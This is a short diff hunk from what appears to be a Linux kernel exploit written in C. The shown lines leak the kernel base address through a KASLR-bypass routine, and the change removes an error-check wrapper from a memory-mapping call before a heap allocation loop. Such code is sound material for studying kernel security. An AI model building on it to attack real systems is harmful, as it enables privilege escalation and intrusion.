@@ -22,7 +22,7 @@ int main(int argc, char* argv[]) {
   uint64_t kbase = kasld();
   set_kbase((void*)kbase);
 
-  SYSCHK(dmmap(NULL, MAPDEF));
+  dmmap(NULL, MAPDEF);
 
   void* ptr = malloc(0x40);
   REP2(i, 0x40) {
